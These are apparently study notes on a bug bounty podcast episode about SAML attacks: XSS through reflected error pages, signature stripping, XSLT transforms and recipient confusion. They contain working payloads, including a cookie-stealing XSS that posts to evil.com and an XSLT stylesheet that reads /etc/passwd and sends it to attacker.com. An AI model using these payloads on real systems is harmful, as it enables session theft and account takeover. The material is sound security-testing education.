# EP46: The SAML Ramble - Client-Side Security Notes

## Metadata
- **Podcast:** Critical Thinking Bug Bounty Podcast
- **Episode:** 46
- **Title:** The SAML Ramble
- **Host:** Justin Gardner (@rhynorater) -- solo episode
- **Date:** ~Late 2023
- **Key Resources Referenced:**
  - epi052's 3-part SAML testing methodology (2019)
  - Green Dog's "How to Break SAML If I Have Paws" (CozHackStan conference)
  - SAML Raider Burp extension
  - Michael Stepankin's Black Hat 2023 X.509 SSRF research
  - HackerOne Report #136169 (Uber/OneLogin SAML auth bypass by Jokel)

---

## Context: Why SAML Matters for Client-Side Hunters

SAML (Security Assertion Markup Language) is primarily a server-side authentication protocol, but its flow is **browser-mediated**. The SAML Response -- a Base64-encoded XML document -- is passed through the user's browser via redirects and POST bodies. This creates a client-side attack surface at every point where the browser touches, reflects, or renders SAML data.

Justin emphasizes: there is a **strong correlation between SAML implementations and XSS vulnerabilities**. The browser acts as the transport mechanism, and service providers frequently reflect SAML data into HTML responses without proper output encoding.

---

## Technique 1: XSS via SAML Response Reflection into the DOM

This is the primary client-side finding discussed in this episode. Justin describes a real bug he found and reported (private program).

### How It Works

1. User initiates SAML SSO login to a Service Provider (SP)
2. SP generates a SAML Request and redirects the browser to the Identity Provider (IDP)
3. User authenticates at the IDP
4. IDP creates a SAML Response containing signed assertions
5. Browser carries the SAML Response back to the SP (via POST or redirect)
6. **Attacker intercepts this flow and modifies SAML Response attributes**
7. SP receives the modified response, finds an error (e.g., invalid destination)
8. SP reflects the invalid value back into an HTML error page **without sanitization**
9. XSS fires in the victim's browser on the SP's origin

```
Step-by-step attack flow:

  Attacker                         Browser                        Service Provider (SP)
     |                                |                                    |
     |  1. Intercept SAML Response    |                                    |
     |  (Base64 decode + XML inflate) |                                    |
     |                                |                                    |
     |  2. Modify <samlp:Response     |                                    |
     |     Destination="PAYLOAD">     |                                    |
     |                                |                                    |
     |  3. Re-encode (Base64)         |                                    |
     |  --------------------------->  |                                    |
     |                                |  4. POST SAMLResponse to SP ACS    |
     |                                |  --------------------------------> |
     |                                |                                    |
     |                                |  5. SP checks Destination attr     |
     |                                |     "PAYLOAD" != expected URL      |
     |                                |                                    |
     |                                |  6. SP renders error page:         |
     |                                |     "Response received at PAYLOAD  |
     |                                |      instead of https://sp.com"    |
     |                                |                                    |
     |                                |  <-- text/html with PAYLOAD in DOM |
     |                                |                                    |
     |                                |  7. XSS FIRES on SP origin         |
     |                                |                                    |
```

### The HTML Encoding Trick (Critical Detail)

SAML is XML. If you inject raw `<script>` tags into an XML attribute, it breaks XML parsing and the request fails before reaching the SP. The trick is to **HTML-entity-encode** your XSS payload inside the XML attribute value:

```xml
<!-- BEFORE: Raw injection breaks XML parsing -->
<samlp:Response
    Destination="<script>alert(1)</script>"
    ...>
<!-- XML parser chokes here. Never reaches the SP. -->

<!-- AFTER: HTML-entity-encode the payload inside the XML attribute -->
<samlp:Response
    Destination="&lt;script&gt;alert(document.domain)&lt;/script&gt;"
    ...>
<!--
    XML parser sees valid entity references, parses fine.
    SP receives the decoded value: <script>alert(document.domain)</script>
    SP reflects it into an HTML error page WITHOUT re-encoding.
    Browser executes the script.
-->
```

Step-by-step injection process:

```
1. Base64 decode the SAMLResponse parameter
2. XML inflate / decompress (if deflated)
3. Locate reflection-prone attributes:
   - Destination attribute on <samlp:Response>
   - AssertionConsumerServiceURL
   - Recipient in <SubjectConfirmationData>
   - Issuer value
   - Any URL-type attribute
4. Replace value with HTML-encoded XSS payload:
   &lt;img src=x onerror=alert(document.domain)&gt;
5. Re-encode: XML deflate (if needed) -> Base64 encode
6. Submit modified SAMLResponse to SP's ACS endpoint
7. If SP reflects the error with Content-Type: text/html -> XSS
```

### Why This Works

- SAML responses flow **through the browser** -- the attacker controls the data in transit
- XML attribute values support HTML entity encoding (`&lt;`, `&gt;`, `&amp;`)
- The XML parser decodes entities during parsing, producing raw `<script>` in the attribute value
- When the SP reflects this into an HTML error page, it is treated as live HTML/JS
- **HTML encoding is normally the defender's tool** -- here it is the attacker's tool to smuggle payloads through XML

### Where To Apply This

- **Every SAML ACS (Assertion Consumer Service) endpoint** on a target -- these are the URLs that receive the SAML Response POST
- **Error pages** generated by SAML processing -- invalid destination, expired assertion, missing attributes, signature failures
- Inject into ALL attributes and element values in the SAML Response, not just the obvious ones
- Test both the SP side (app) and the IDP side (SSO portal) -- both parse user-influenced XML
- **SAML Request too**: The SAML Request goes from SP to IDP. If the IDP reflects errors from the request back into HTML, same attack applies in the other direction

```
Target attributes to inject into (check all of these):

<samlp:Response Destination="INJECT_HERE" ...>
<saml:Issuer>INJECT_HERE</saml:Issuer>
<saml:Audience>INJECT_HERE</saml:Audience>
<saml:SubjectConfirmationData Recipient="INJECT_HERE" .../>
<saml:Attribute Name="INJECT_HERE">
  <saml:AttributeValue>INJECT_HERE</saml:AttributeValue>
</saml:Attribute>
<saml:NameID>INJECT_HERE</saml:NameID>
```

---

## Technique 2: SAML Browser Redirect Flow as Attack Surface

The entire SAML authentication flow is browser-mediated. This makes every redirect in the chain a potential open redirect or XSS vector.

### How It Works

```
SAML SSO Flow (Browser-Mediated):

  User/Browser              Service Provider (SP/App)         Identity Provider (IDP/SSO)
       |                            |                                    |
       | 1. GET /protected-resource |                                    |
       | -------------------------> |                                    |
       |                            |                                    |
       | 2. 302 Redirect            |                                    |
       |    Location: https://idp.com/sso?SAMLRequest=BASE64_XML         |
       | <------------------------- |                                    |
       |                                                                 |
       | 3. GET /sso?SAMLRequest=...                                     |
       | --------------------------------------------------------------> |
       |                                                                 |
       | 4. IDP login page                                               |
       | <-------------------------------------------------------------- |
       |                                                                 |
       | 5. POST credentials                                             |
       | --------------------------------------------------------------> |
       |                                                                 |
       | 6. IDP generates signed SAML Response                           |
       |    Returns auto-submitting HTML form:                           |
       |    <form action="https://sp.com/acs" method="POST">             |
       |      <input name="SAMLResponse" value="BASE64_XML"/>            |
       |      <input name="RelayState" value="..."/>                     |
       |    </form>                                                      |
       |    <script>document.forms[0].submit()</script>                  |
       | <-------------------------------------------------------------- |
       |                                                                 |
       | 7. Browser auto-submits form to SP's ACS endpoint               |
       | -------------------------> |                                    |
       |                            |                                    |
       | 8. SP validates assertion,  |                                    |
       |    sets session cookie,     |                                    |
       |    redirects to RelayState  |                                    |
       | <------------------------- |                                    |
```

Key client-side attack points in this flow:

```
Attack Point A: SAMLRequest parameter (Step 2)
  - Attacker-controlled if SP accepts user-provided RelayState/return URL
  - XML content flows to IDP, may be reflected in IDP error pages

Attack Point B: RelayState parameter (Steps 6-8)
  - Often contains the URL the user should be redirected to AFTER auth
  - Classic open redirect / XSS vector if not validated
  - SP redirects to RelayState value after successful SAML assertion

Attack Point C: The auto-submit form (Step 6)
  - IDP sends an HTML page with JavaScript that auto-submits the form
  - If attacker can influence the ACS URL or form action -> redirect manipulation

Attack Point D: SAMLResponse in browser (Step 7)
  - Full SAML Response passes through browser as a POST parameter
  - Attacker can intercept and modify before it reaches SP
```

### Why This Works

- SAML was designed before modern browser security models matured
- The protocol relies on the browser as a trusted transport -- it is not
- RelayState is essentially a return URL parameter, subject to the same open redirect / XSS issues as any `redirect_uri` or `returnTo` parameter
- The auto-submitting form pattern means JavaScript execution happens on the IDP origin

### Where To Apply This

- **RelayState parameter**: Treat this exactly like a `redirect_uri` or `returnTo` parameter. Test for open redirect and javascript: URI injection
- **ACS URL manipulation**: If the SP allows configuring the ACS URL dynamically (e.g., via the SAML Request), test whether you can redirect the SAML Response to an attacker-controlled endpoint
- **SSO initiation URLs**: Many apps have URLs like `/sso/login?returnTo=` -- these are the exact pattern from the knowledge base that leads to XSS/open redirect (reference: Reports 1-3 in REPORTS_SUMMARY pattern)

---

## Technique 3: XSS via SAML Attribute Reflection

Beyond error pages, SAML attribute values often get rendered into the authenticated user's profile or dashboard page.

### How It Works

1. Attacker controls an IDP (or compromises SAML response in transit)
2. SAML assertion contains user attributes (name, email, role, etc.)
3. If signature validation is weak/missing (see Technique 4), attacker modifies attribute values
4. SP trusts the assertion and stores/displays these attribute values
5. Attribute values render into HTML without encoding -> Stored XSS

```xml
<!-- Modified SAML assertion with XSS in attribute value -->
<saml:Assertion>
  <saml:AttributeStatement>
    <saml:Attribute Name="displayName">
      <saml:AttributeValue>
        <!-- HTML-encoded in XML, decoded by XML parser,
             stored raw in SP database, rendered in HTML -->
        &lt;img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)&gt;
      </saml:AttributeValue>
    </saml:Attribute>

    <saml:Attribute Name="email">
      <saml:AttributeValue>
        <!-- Some SPs render email addresses unescaped -->
        ">&lt;script&gt;alert(document.domain)&lt;/script&gt;@evil.com
      </saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
```

### Why This Works

- SPs often trust IDP-provided attributes implicitly after signature validation
- If signature validation is skipped (Technique 4) or bypassed (signature wrapping), attributes are fully attacker-controlled
- Attribute values get stored in the SP's database and rendered on profile pages, admin panels, audit logs
- This can result in **Stored XSS** rather than just Reflected XSS

### Where To Apply This

- After confirming signature exclusion or wrapping works, escalate to XSS via attributes
- Target attributes that are likely displayed: `displayName`, `firstName`, `lastName`, `email`, `role`
- Check admin panels and user management pages where these attributes are rendered
- This is especially impactful when it leads to **Account Takeover**: XSS on the SP during the auth flow can steal session tokens

---

## Technique 4: Signature Exclusion Enabling Client-Side Attacks

While signature exclusion is itself a server-side issue, it is the **enabler** for all the client-side attacks above. Without it, you cannot freely modify SAML Response content.

### How It Works

```
Normal SAML Response structure:

<samlp:Response>
    <ds:Signature>                    <-- Cryptographic signature
        <ds:SignedInfo>
            <ds:Reference URI="#assertion123"/>
        </ds:SignedInfo>
        <ds:SignatureValue>...</ds:SignatureValue>
        <ds:KeyInfo>...</ds:KeyInfo>
    </ds:Signature>
    <saml:Assertion ID="assertion123">
        <saml:AttributeStatement>
            ...user attributes...
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>


Attack: Simply remove the <ds:Signature> block entirely:

<samlp:Response>
    <!-- Signature block DELETED -->
    <saml:Assertion ID="assertion123">
        <saml:AttributeStatement>
            <!-- Attacker now controls all attributes freely -->
            <saml:Attribute Name="email">
                <saml:AttributeValue>admin@target.com</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>
```

Workflow for testing:

```
1. Capture a valid SAML Response (from a real login)
2. Base64 decode it
3. XML inflate/decompress if needed
4. Delete ALL <ds:Signature>...</ds:Signature> blocks
5. Modify assertion attributes as desired
6. Re-encode and submit to SP's ACS endpoint
7. If SP accepts it -> full auth bypass + XSS via attribute injection
```

### Why This Works

- Many SAML libraries don't enforce signature presence by default
- Some SPs only check "is the signature valid IF present" rather than "is a signature present AND valid"
- WordPress OneLogin plugin (HackerOne #136169 on Uber) accepted assertions with zero signatures
- SP just kept asking "you're missing this attribute" until attacker filled them all, then logged them in

### Where To Apply This

- First thing to test on ANY SAML endpoint
- If it works, you now have full control over every attribute in the SAML Response
- Escalate to: auth bypass, account takeover, XSS via attribute injection, privilege escalation
- Test with both: a captured real SAML response (with signatures stripped) AND a from-scratch template

---

## Technique 5: XSLT Transformation -- Pre-Signature Code Execution

This is primarily server-side (file read, SSRF), but Justin highlights one critical client-side implication: **XSLT transformations are processed BEFORE signature validation**. This means even a properly signed SAML response can be modified to include transforms that execute before the signature is checked.

### How It Works

```xml
<!-- XSLT payload injected into the Signature's Transform element -->
<ds:Signature>
  <ds:SignedInfo>
    <ds:Reference URI="#assertion123">
      <ds:Transforms>
        <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">

          <!-- This entire XSLT stylesheet executes BEFORE signature validation -->
          <xsl:stylesheet version="1.0"
            xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

            <!-- match="/" targets the root XML node (document root) -->
            <!-- NOTE: epi052's original uses match="doc" which may need changing -->
            <xsl:template match="/">

              <!-- Read a local file -->
              <xsl:variable name="file"
                select="document('/etc/passwd')"/>

              <!-- Encode and exfiltrate -->
              <xsl:variable name="encoded"
                select="encode-for-uri($file)"/>

              <xsl:value-of
                select="document(concat('https://attacker.com/exfil?data=', $encoded))"/>

            </xsl:template>
          </xsl:stylesheet>

        </ds:Transform>
      </ds:Transforms>
    </ds:Reference>
  </ds:SignedInfo>
</ds:Signature>
```

```
Execution timeline:

  Browser sends SAMLResponse to SP
            |
            v
  SP Base64 decodes, XML parses
            |
            v
  SP encounters <ds:Transform> with XSLT algorithm
            |
            v
  *** XSLT EXECUTES HERE ***        <-- BEFORE signature check
  (file read, SSRF, data exfil)
            |
            v
  SP attempts signature validation   <-- Too late, damage done
            |
            v
  Signature may fail, but the
  XSLT side effects already happened
```

### Why This Works

- The XML Digital Signature spec requires transforms to be applied before signature verification
- XSLT is a Turing-complete language embedded within XML
- Signature validation cannot prevent the transform from executing -- it runs first by design
- Even if the SP correctly validates signatures, the XSLT payload has already executed

### Where To Apply This

- Any SAML endpoint, even those with strict signature validation
- The transform is inside the Signature block itself, so it does not require modifying signed content
- Watch for the `match` attribute: use `match="/"` (root) not `match="doc"` for reliable execution
- SAML Raider (Burp extension) can help generate these payloads

---

## Technique 6: Token Recipient Confusion

### How It Works

If a single IDP services multiple SPs (apps), a valid SAML assertion for App A might be accepted by App B.

```
Attacker has legitimate account on App A
Both App A and App B use the same IDP

  Attacker                    IDP                    App A           App B (target)
     |                         |                       |                  |
     | 1. Login to App A       |                       |                  |
     | ----------------------> |                       |                  |
     |                         |                       |                  |
     | 2. IDP issues SAML      |                       |                  |
     |    Response for App A   |                       |                  |
     | <---------------------- |                       |                  |
     |                                                                    |
     | 3. Instead of sending to App A,                                    |
     |    send SAML Response to App B's ACS endpoint                      |
     | -----------------------------------------------------------------> |
     |                                                                    |
     | 4. If App B does NOT check the Recipient/Destination               |
     |    fields, it accepts the assertion                                |
     | <----------------------------------------------------------------- |
     |    "Welcome, attacker! You're now logged in to App B"              |
```

### Why This Works

- The `Recipient` attribute in `<SubjectConfirmationData>` and the `Destination` attribute on `<samlp:Response>` are supposed to restrict which SP can consume the assertion
- Many SPs skip this validation entirely
- The signature IS valid (it was legitimately signed by the IDP) -- the SP just should not accept it

### Where To Apply This

- When a target organization uses SAML SSO across multiple applications
- Especially when you have a legitimate low-privilege account on one app and want access to another
- Similar to OAuth token reuse attacks (reference: Evan Connolly's Tesla finding)

---

## XSS to Account Takeover in SAML Flows

Justin explicitly states: XSS in a SAML flow frequently escalates to Account Takeover.

### How It Works

```
SAML XSS -> Account Takeover chain:

  Victim clicks attacker's crafted SAML login link
            |
            v
  Browser redirected through IDP (victim authenticates)
            |
            v
  IDP sends SAML Response back to SP (via browser)
            |
            v
  SP processes SAML Response, encounters error,
  reflects attacker payload into DOM
            |
            v
  XSS executes on SP origin:
    - Steal session cookies (if not HttpOnly)
    - Steal SP's CSRF tokens
    - Hijack the SAML flow mid-authentication
    - Make authenticated API calls as the victim
    - Exfiltrate the SAML Response itself (contains identity assertions)
            |
            v
  Account Takeover
```

### Where To Apply This

- Any XSS found in a SAML flow should be assessed for ATO potential
- Check if session cookies lack HttpOnly flag
- Check if there are API endpoints accessible from the XSS context
- The XSS fires on the SP origin, meaning it has access to everything the SP serves

---

## Tools & Workflow for Client-Side SAML Testing

```
Recommended workflow:

1. IDENTIFY SAML endpoints
   rg -n "SAMLResponse|SAMLRequest|RelayState|saml" ./target/

2. INTERCEPT a valid SAML flow
   - Use Burp Suite to capture the full SAML exchange
   - Identify ACS endpoint, RelayState handling, error page behavior

3. DECODE the SAML Response
   - Base64 decode
   - XML inflate (if compressed)
   - Examine structure in an XML editor

4. TEST with SAML Raider (Burp Extension)
   - Free extension, works with Community Edition
   - Automates signature exclusion, wrapping, certificate faking
   - Handles encoding/decoding automatically

5. INJECT XSS payloads into SAML attributes
   - HTML-encode payloads for XML compatibility
   - Target: Destination, Issuer, Audience, Recipient, AttributeValues
   - Check if errors reflect into HTML responses

6. TEST RelayState for open redirect / XSS
   - Treat it like any returnTo / redirect_uri parameter
   - Try javascript: URIs, data: URIs, protocol-relative URLs

7. VERIFY in browser
   - Confirm XSS fires in a real browser context
   - Check CSP headers on the SP's ACS endpoint
   - Assess ATO potential
```

---

## Key Quotes

> "I've noticed a pretty strong correlation between libraries and domains that use SAML and XSS."

> "HTML encoding is normally our enemy in these scenarios, right, if you see it HTML encoded, that's bad. But in order for it to not break it and for it to parse properly, we have to HTML encode it sometimes, and then it will get reinjected back into the DOM, HTML decoded, and in its full XSS glory."

> "When you get XSS on an app like this, a lot of times it will result in account takeover because you can leverage that position in the SAML flow, in the auth flow to hijack that page and hijack the user session."

> "There's a token that is being taken and used for authentication, and there is a whole Turing complete language [XSLT] that you may be able to use in the parsing of this token, which gets processed before the cryptographic signature gets processed."

> "Whenever I see SAML, it's like, oh, there's gotta be a bug on the scope somewhere because not all of these things can be parsing it exactly the same way."

> "He essentially just did what I mentioned before which was he took a SAML response... keeps on doing that until he fills out all the attributes. And then it's like, alright cool, got all the attributes, log you right on in. There's not even a signature tag in this whole payload."

---

## Summary Table

| # | Technique | Type | Impact | Complexity |
|---|-----------|------|--------|------------|
| 1 | XSS via SAML Response Reflection (error pages) | DOM XSS / Reflected XSS | High (ATO possible) | Low |
| 2 | SAML Browser Redirect Flow Manipulation (RelayState) | Open Redirect / XSS | Medium-High | Low |
| 3 | XSS via SAML Attribute Injection (stored in SP) | Stored XSS | High (ATO possible) | Medium |
| 4 | Signature Exclusion (enables client-side attacks) | Auth Bypass / XSS enabler | Critical | Low |
| 5 | XSLT Pre-Signature Execution | SSRF / File Read (server-side, but browser-delivered) | Critical | Medium |
| 6 | Token Recipient Confusion | Auth Bypass | Critical | Medium |
| 7 | HTML Encoding Trick for XML XSS Smuggling | XSS technique | N/A (technique, not standalone) | Low |
| 8 | SAML XSS to Account Takeover Chain | ATO via XSS | Critical | Low-Medium |

---

## Resources & References

- **epi052's SAML Testing Methodology** (3-part series, 2019) -- Primary resource for this episode. Covers all attack vectors with SAML Raider examples.
- **Green Dog's "How to Break SAML If I Have Paws"** -- CozHackStan conference talk. Slide 26 covers XSLT transformations.
- **Green Dog's "Weird Proxies" repo** -- Related research on proxy/protocol parsing differentials.
- **SAML Raider** -- Burp Suite extension for SAML testing (works with Community Edition). Automates signature exclusion, wrapping attacks, and certificate faking.
- **HackerOne Report #136169** -- Jokel's public report on OneLogin SAML auth bypass on Uber's newsroom.uber.com (WordPress plugin, May 2016). Textbook signature exclusion.
- **Michael Stepankin's Black Hat 2023 research** -- X.509 certificate extensions (Authority Information Access) causing SSRF during cert validation. Published on GitHub blog.
- **Project Zero XSLT/XXE bypass** -- 2022 research on using XSLT transforms to bypass disabled XML entity processing in SAML libraries.
- **Evan Connolly's Tesla finding** -- Token reuse / IDP confusion similar to SAML token recipient confusion.

---

## Note on Client-Side vs Server-Side Content

This episode is primarily focused on SAML as a protocol and its server-side attack vectors (XXE, XSLT, signature bypass, auth bypass). However, the client-side surface is significant and often overlooked:

1. **The SAML flow is entirely browser-mediated** -- every redirect, every form submission, every error page is a client-side touchpoint
2. **XSS via SAML reflection is explicitly called out** as a common, high-impact finding
3. **The HTML encoding trick** (encoding XSS payloads as XML entities to survive XML parsing, then have them decode into HTML context) is a directly actionable client-side technique
4. **RelayState** is a classic redirect parameter vulnerable to the same open redirect / XSS patterns seen in OAuth flows
5. **XSS in SAML flows frequently chains to Account Takeover** due to the authentication context

The server-side attacks (signature exclusion, wrapping, certificate faking, XXE, XSLT) serve as **enablers** for the client-side attacks -- once you can modify SAML Response content freely, every reflection point becomes exploitable.
